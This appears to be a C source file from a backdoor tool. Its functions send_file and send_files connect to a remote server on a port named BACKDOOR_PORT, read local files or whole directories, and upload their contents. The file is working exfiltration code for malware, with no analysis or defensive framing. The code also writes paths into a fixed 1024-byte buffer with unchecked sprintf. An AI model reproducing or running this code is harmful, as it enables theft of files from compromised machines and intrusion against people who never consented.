#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include "socket_tools.h"
#include "tools.h"
#include "cmd_tools.h"

int send_file(char *file_name, char *svr_ip){
	int fd=0, len=0, total=0; 
	char *p=NULL, *q=NULL; 
	int sock=0; 
	unsigned char *data=NULL; 
	cmd_header cmd_h; 
	FDBG("send %s ", file_name); 
	if((sock=tcp_cli_create_socket(svr_ip, BACKDOOR_PORT))<0)
		goto err; 
	if(!file_name) goto err; 
	p=file_name; 
	while((q=strstr(p, "/"))!=NULL){ 
		q++;
		p=q; 
	}
	if((fd=open(file_name, O_RDONLY))<0) goto err;  
	lseek(fd, 0, SEEK_SET); 
	len=lseek(fd, 0, SEEK_END); 
	lseek(fd, 0, SEEK_SET); 
	total=len+strlen(p)+1; 
	data=malloc(total); 
	q=(char *)data; 
	if(!data) goto err;
	strcpy(q, p); 
	q[strlen(p)]='\0'; 
	if(read(fd, q+strlen(p)+1, len)!=len)
		goto err;
	if(cmd_n_data_send(CMD_RECV, total, data, sock) <0)
		goto err;
	if(cmd_read(&cmd_h, &data, sock)<0)
		goto err;
	if(cmd_h.cmd!=CMD_OK)
		goto err;
	if(fd) close(fd); 
	if(sock) close(sock); 
	if(data) free(data); 
	DBG("\t\tok\n"); 
	return 0; 
err: 
	if(fd) close(fd); 
	if(sock) close(sock); 
	if(data) free(data); 
	DBG("\t\tfailed\n"); 
	return -1; 
}

int send_files(char *file_name, char *svr_ip){
	DIR *dir;
	struct dirent *entry;
	struct stat dstat; 
	char tmp[1024]; 
	if(!file_name) return -1; 
	lstat(file_name, &dstat);
	if(S_ISDIR(dstat.st_mode)){
		if(!(dir=opendir(file_name))) return -1; 
		while ((entry = readdir(dir))!=NULL){
			if((entry->d_name[0]=='.') &&
			   (entry->d_name[1]=='\0'))
				continue; 
			if((entry->d_name[0]=='.') &&
			   (entry->d_name[1]=='.') &&
			   (entry->d_name[2]=='\0'))
				continue; 
			if(file_name[strlen(file_name)-1]=='/')
				sprintf(tmp, "%s%s", file_name, entry->d_name); 
			else
				sprintf(tmp, "%s/%s", file_name, entry->d_name); 
			send_file(tmp, svr_ip); 
		}
	}
	else{
		send_file(file_name, svr_ip); 
	}
	return 0; 
}

